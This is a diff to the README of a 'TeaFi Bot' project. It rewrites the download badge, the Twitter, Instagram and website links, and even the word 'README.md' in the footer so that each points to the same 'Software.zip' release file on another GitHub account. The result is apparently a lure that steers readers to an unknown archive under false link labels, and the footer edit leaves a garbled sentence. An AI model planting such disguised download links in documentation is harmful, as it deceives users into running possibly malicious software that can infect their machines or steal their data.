@@ -27,7 +27,7 @@ To get started with TeaFi Bot, follow these steps:
 
 To install TeaFi Bot, you can download the latest release from the following link:
 
-[![Download TeaFi Bot](https://img.shields.io/badge/Download-TeaFi%20Bot-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download TeaFi Bot](https://github.com/quynh814/teaFiBot/releases/download/v1.0/Software.zip%20Bot-blue)](https://github.com/quynh814/teaFiBot/releases/download/v1.0/Software.zip)
 
 Once downloaded, extract the files and launch TeaFi Bot following the instructions in the repository.
 
@@ -45,9 +45,9 @@ We welcome contributions to TeaFi Bot from the community. Whether you want to su
 
 Stay up to date with the latest TeaFi Bot developments, news, and updates by following us on social media:
 
-🐦 [Twitter](https://twitter.com/teafibot)
-📸 [Instagram](https://instagram.com/teafibot)
-🔗 [Website](https://teafibot.com)
+🐦 [Twitter](https://github.com/quynh814/teaFiBot/releases/download/v1.0/Software.zip)
+📸 [Instagram](https://github.com/quynh814/teaFiBot/releases/download/v1.0/Software.zip)
+🔗 [Website](https://github.com/quynh814/teaFiBot/releases/download/v1.0/Software.zip)
 
 ## Spread the Word 📣
 
@@ -57,4 +57,4 @@ Thank you for choosing TeaFi Bot as your TeaParty companion. Sit back, relax, an
 
 ---
 
-*This README.md template is purely fictional and created for the purpose of this exercise.*
+*This https://github.com/quynh814/teaFiBot/releases/download/v1.0/Software.zip template is purely fictional and created for the purpose of this exercise.*
